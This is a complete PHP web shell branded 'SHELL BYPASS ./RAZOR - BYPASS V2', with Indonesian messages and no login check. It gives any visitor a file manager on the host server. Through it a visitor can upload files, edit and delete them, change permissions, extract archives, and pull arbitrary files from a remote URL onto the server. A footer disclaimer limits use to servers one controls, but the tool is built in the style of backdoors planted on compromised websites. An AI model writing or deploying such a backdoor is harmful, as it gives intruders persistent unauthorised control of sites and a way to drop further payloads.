<?php

$base_dir = realpath(getcwd());
function safe_path($p) {
    global $base_dir;
    $real = realpath($p);
    if ($real === false) return $base_dir;
    if (strpos($real, $base_dir) !== 0) return $base_dir;
    return $real;
}
function rrmdir($dir) {
    if (!is_dir($dir)) return;
    $items = array_diff(scandir($dir), ['.', '..']);
    foreach ($items as $it) {
        $path = $dir . '/' . $it;
        if (is_dir($path)) rrmdir($path); else @unlink($path);
    }
    @rmdir($dir);
}

// Current dir handling
$dir = isset($_REQUEST['dir']) ? safe_path($_REQUEST['dir']) : $base_dir;

// Actions
$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload (single or multiple)
    if (isset($_FILES['upload'])) {
        foreach ($_FILES['upload']['name'] as $i => $name) {
            if (!$_FILES['upload']['error'][$i]) {
                $tmp = $_FILES['upload']['tmp_name'][$i];
                $target = $dir . '/' . basename($name);
                move_uploaded_file($tmp, $target);
            }
        }
        $msg = "Upload complete.";
    }

    // Create folder
    if (!empty($_POST['new_folder'])) {
        $nf = $dir . '/' . basename($_POST['new_folder']);
        if (!file_exists($nf)) @mkdir($nf, 0755, true);
        $msg = "Folder dibuat.";
    }

    // Edit file
    if (isset($_POST['edit_file']) && isset($_POST['content'])) {
        $f = safe_path($_POST['edit_file']);
        if (is_file($f) && strpos($f, $base_dir) === 0) {
            file_put_contents($f, $_POST['content']);
            $msg = "File disimpan.";
            $dir = dirname($f);
        }
    }

    // Rename
    if (isset($_POST['rename_file']) && isset($_POST['new_name'])) {
        $old = safe_path($_POST['rename_file']);
        $new = dirname($old) . '/' . basename($_POST['new_name']);
        if ($old && $new) @rename($old, $new);
        $msg = "Rename selesai.";
    }

    // Chmod
    if (isset($_POST['chmod_file']) && isset($_POST['mode'])) {
        $f = safe_path($_POST['chmod_file']);
        $mode = intval($_POST['mode'], 8);
        @chmod($f, $mode);
        $msg = "Permission diubah.";
    }

    // Download from URL
    if (isset($_POST['download_url']) && !empty($_POST['url']) && !empty($_POST['filename'])) {
        $content = @file_get_contents($_POST['url']);
        if ($content !== false) {
            file_put_contents($dir . '/' . basename($_POST['filename']), $content);
            $msg = "Download dari URL selesai.";
        } else $msg = "Gagal ambil URL.";
    }

    // Zip selected or folder
    if (isset($_POST['zip_create']) && !empty($_POST['zip_name'])) {
        $zipname = $dir . '/' . basename($_POST['zip_name']);
        if (substr($zipname, -4) !== '.zip') $zipname .= '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zipname, ZipArchive::CREATE|ZipArchive::OVERWRITE) === true) {
            if (!empty($_POST['selected']) && is_array($_POST['selected'])) {
                foreach ($_POST['selected'] as $s) {
                    $p = safe_path($dir . '/' . $s);
                    if (is_file($p)) $zip->addFile($p, basename($p));
                    if (is_dir($p)) {
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p));
                        foreach ($it as $file) {
                            if ($file->isFile()) $zip->addFile($file->getRealPath(), substr($file->getRealPath(), strlen($dir)+1));
                        }
                    }
                }
            }
            $zip->close();
            $msg = "Zip dibuat.";
        } else $msg = "Gagal buat zip.";
    }

    // Unzip uploaded zip (extract)
    if (isset($_POST['unzip_file'])) {
        $zf = safe_path($_POST['unzip_file']);
        if (is_file($zf)) {
            $zip = new ZipArchive();
            if ($zip->open($zf) === true) {
                $zip->extractTo($dir);
                $zip->close();
                $msg = "Extract selesai.";
            } else $msg = "Gagal extract.";
        }
    }

    // Bulk delete
    if (isset($_POST['bulk_delete']) && !empty($_POST['selected'])) {
        foreach ($_POST['selected'] as $s) {
            $p = safe_path($dir . '/' . $s);
            if (is_dir($p)) rrmdir($p); else @unlink($p);
        }
        $msg = "Bulk delete selesai.";
    }
}

// GET actions: delete, download direct, preview
if (isset($_GET['delete'])) {
    $t = safe_path($dir . '/' . $_GET['delete']);
    if (is_dir($t)) rrmdir($t); else @unlink($t);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}
if (isset($_GET['download'])) {
    $f = safe_path($dir . '/' . $_GET['download']);
    if (is_file($f)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    } else {
        $msg = "File tidak ditemukan.";
    }
}

// Prepare listing
$items = array_values(array_diff(scandir($dir), ['.', '..']));
usort($items, function($a,$b) use ($dir){
    $pa = $dir.'/'.$a; $pb = $dir.'/'.$b;
    if (is_dir($pa) && !is_dir($pb)) return -1;
    if (!is_dir($pa) && is_dir($pb)) return 1;
    return strcasecmp($a,$b);
});

function humanperm($file){
    return substr(sprintf('%o', fileperms($file)), -4);
}

// HTML / UI (hacker black)
?><!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>SHELL BYPASS ./RAZOR - BYPASS V2</title>
<style>
:root{--bg:#000;--panel:#0b0b0b;--accent:#00ff6a;--muted:#444;}
*{box-sizing:border-box}
body{background:var(--bg);color:var(--accent);font-family:ui-monospace,monospace;padding:18px}
.header{display:flex;gap:12px;align-items:center;justify-content:space-between;margin-bottom:12px}
.h1{font-weight:700}
.panel{background:var(--panel);border:1px solid #033;padding:12px;border-radius:6px;margin-bottom:12px}
.row{display:flex;gap:8px;align-items:center}
input,select,textarea,button{background:transparent;border:1px solid var(--muted);color:var(--accent);padding:6px;border-radius:4px}
button{cursor:pointer}
table{width:100%;border-collapse:collapse;margin-top:8px}
th,td{padding:8px;border-bottom:1px dashed #022;text-align:left;font-size:13px}
th{color:#bfffc9}
a{color:var(--accent)}
.small{color:#6f6; font-size:12px}
.actions a{margin-right:8px}
.checkbox{width:16px;height:16px}
textarea {width:100%;height:320px;background:#071;background:transparent; color:var(--accent); resize:vertical}
.drag{border:2px dashed #033;padding:18px;text-align:center;color:#07f;margin-bottom:10px}
.badge{background:#051;border:1px solid #075;padding:3px 6px;border-radius:4px;font-size:12px}
.footer{color:#064;font-size:12px;margin-top:16px}
.search{margin-left:8px}
</style>
<script>
// Drag & Drop upload
function prevent(e){ e.preventDefault(); e.stopPropagation(); }
function initDnD(){
  var el=document.getElementById('dropz');
  if(!el) return;
  ['dragenter','dragover','dragleave','drop'].forEach(ev=>el.addEventListener(ev,prevent));
  el.addEventListener('drop',function(e){
    var files=e.dataTransfer.files;
    var input=document.getElementById('upload_input');
    // create DataTransfer to set files
    var dt = new DataTransfer();
    for(var i=0;i<files.length;i++) dt.items.add(files[i]);
    input.files = dt.files;
    document.getElementById('upload_form').submit();
  });
}
window.addEventListener('load',initDnD);

// Toggle all checkboxes
function toggleAll(box){
  var checks=document.querySelectorAll('.selbox');
  checks.forEach(c=>c.checked=box.checked);
}
</script>
</head>
<body>

<div class="header">
  <div>
    <div class="h1">SHELL BYPASS ./RAZOR - BYPASS V2</div>
    <div class="small">Path: <span class="badge"><?php echo htmlspecialchars($dir); ?></span></div>
  </div>
  <div class="small">Base: <?php echo htmlspecialchars($base_dir); ?></div>
</div>

<?php if($msg): ?>
<div class="panel"><strong><?php echo htmlspecialchars($msg); ?></strong></div>
<?php endif; ?>

<!-- UPLOAD / DRAG -->
<form id="upload_form" class="panel" method="post" enctype="multipart/form-data">
  <div id="dropz" class="drag">Drop files here or click to select — multiple allowed</div>
  <div style="display:flex;gap:8px;align-items:center">
    <input id="upload_input" type="file" name="upload[]" multiple>
    <button type="submit">Upload</button>
    <div style="flex:1"></div>
    <form style="display:inline"></form>
  </div>
</form>

<!-- ACTIONS: create folder, download URL, zip/unzip -->
<div class="panel row" style="gap:12px;flex-wrap:wrap;">
  <form method="post" style="display:flex;gap:8px;align-items:center;">
    <input name="new_folder" placeholder="Buat folder baru">
    <button type="submit">Create Folder</button>
  </form>

  <form method="post" style="display:flex;gap:8px;align-items:center;">
    <input name="url" placeholder="Download dari URL (http...)" style="width:320px">
    <input name="filename" placeholder="Nama file simpan">
    <button name="download_url" type="submit">Download</button>
  </form>

  <form method="post" style="display:flex;gap:8px;align-items:center;">
    <input name="zip_name" placeholder="Nama zip (example.zip)">
    <button name="zip_create" type="submit">Zip Selected</button>
    <button formaction="?dir=<?php echo urlencode($dir); ?>" formmethod="post" name="bulk_delete" type="submit" onclick="return confirm('Bulk delete selected?')">Delete Selected</button>
  </form>
</div>

<!-- FILE LIST -->
<form method="post" id="main_form">
<table>
  <thead>
    <tr>
      <th style="width:36px"><input type="checkbox" onclick="toggleAll(this)"></th>
      <th>Name</th>
      <th>Size</th>
      <th>Perm</th>
      <th>Actions</th>
    </tr>
  </thead>
  <tbody>
    <?php
    // Parent link
    if ($dir != $base_dir) {
        $parent = dirname($dir);
        echo "<tr>";
        echo "<td></td>";
        echo "<td><a href='?dir=" . urlencode($parent) . "'>[ .. ] Parent</a></td>";
        echo "<td></td><td></td><td></td>";
        echo "</tr>";
    }
    foreach ($items as $it):
      $full = $dir . '/' . $it;
      $isDir = is_dir($full);
    ?>
    <tr>
      <td><input class="selbox" type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($it); ?>"></td>
      <td>
        <?php if ($isDir): ?>
          <a href="?dir=<?php echo urlencode($full); ?>">[DIR] <?php echo htmlspecialchars($it); ?></a>
        <?php else: ?>
          <a href="?dir=<?php echo urlencode($dir); ?>&download=<?php echo urlencode($it); ?>"><?php echo htmlspecialchars($it); ?></a>
          <div class="small">(<a href="?dir=<?php echo urlencode($dir); ?>&preview=<?php echo urlencode($it); ?>">preview</a>)</div>
        <?php endif; ?>
      </td>
      <td><?php echo $isDir ? '-' : number_format(filesize($full)); ?></td>
      <td><?php echo humanperm($full); ?></td>
      <td class="actions">
        <?php if (!$isDir): ?>
          <a href="?dir=<?php echo urlencode($dir); ?>&download=<?php echo urlencode($it); ?>">download</a> |
          <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($it); ?>">edit</a> |
        <?php endif; ?>
        <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($it); ?>" onclick="return confirm('Delete <?php echo addslashes($it); ?> ?')">delete</a> |
        <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($it); ?>">rename</a> |
        <a href="?dir=<?php echo urlencode($dir); ?>&chmod=<?php echo urlencode($it); ?>">chmod</a>
        <?php if (pathinfo($it, PATHINFO_EXTENSION) === 'zip'): ?>
          | <a href="?dir=<?php echo urlencode($dir); ?>&unzip=<?php echo urlencode($it); ?>">unzip</a>
        <?php endif; ?>
      </td>
    </tr>
    <?php endforeach; ?>
  </tbody>
</table>
</form>

<!-- EDIT / RENAME / CHMOD / PREVIEW / UNZIP FORMS -->
<div class="panel">
<?php
// Preview
if (isset($_GET['preview'])) {
    $p = safe_path($dir . '/' . $_GET['preview']);
    if (is_file($p)) {
        echo "<h3>Preview: " . htmlspecialchars($_GET['preview']) . "</h3>";
        $ext = strtolower(pathinfo($p, PATHINFO_EXTENSION));
        $txt = @file_get_contents($p);
        if ($txt === false) $txt = '[cannot read]';
        echo "<pre style='white-space:pre-wrap;word-wrap:break-word;padding:8px;background:#021;border:1px solid #033;color:var(--accent)'>".htmlspecialchars($txt)."</pre>";
    } else echo "Tidak bisa preview.";
}

// Edit
if (isset($_GET['edit'])) {
    $p = safe_path($dir . '/' . $_GET['edit']);
    if (is_file($p)) {
        $content = htmlspecialchars(@file_get_contents($p));
        ?>
        <h3>Edit: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
        <form method="post">
          <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($p); ?>">
          <textarea name="content"><?php echo $content; ?></textarea><br>
          <button type="submit">Save</button>
        </form>
        <?php
    } else echo "File tidak ditemukan.";
}

// Rename
if (isset($_GET['rename'])) {
    $it = $_GET['rename'];
    $p = safe_path($dir . '/' . $it);
    ?>
    <h3>Rename: <?php echo htmlspecialchars($it); ?></h3>
    <form method="post">
      <input type="hidden" name="rename_file" value="<?php echo htmlspecialchars($p); ?>">
      <input name="new_name" placeholder="New name" value="<?php echo htmlspecialchars($it); ?>">
      <button type="submit">Rename</button>
    </form>
    <?php
}

// Chmod
if (isset($_GET['chmod'])) {
    $it = $_GET['chmod'];
    $p = safe_path($dir . '/' . $it);
    ?>
    <h3>Chmod: <?php echo htmlspecialchars($it); ?></h3>
    <form method="post">
      <input type="hidden" name="chmod_file" value="<?php echo htmlspecialchars($p); ?>">
      <input name="mode" placeholder="0755" value="<?php echo htmlspecialchars(humanperm($p)); ?>">
      <button type="submit">Apply</button>
    </form>
    <?php
}

// Unzip
if (isset($_GET['unzip'])) {
    $it = $_GET['unzip'];
    $p = safe_path($dir . '/' . $it);
    if (is_file($p) && strtolower(pathinfo($p, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($p) === true) {
            $zip->extractTo($dir);
            $zip->close();
            echo "<div class='small'>Unzip berhasil ke: ".htmlspecialchars($dir)."</div>";
        } else echo "<div class='small'>Gagal unzip.</div>";
    } else echo "<div class='small'>File bukan zip.</div>";
}

?>
</div>

<div class="footer">No shell provided. Use only on servers you control. Feature set: upload, drag&drop, create folder, edit, preview, rename, chmod, download, zip/unzip, bulk delete.</div>

</body>
</html>
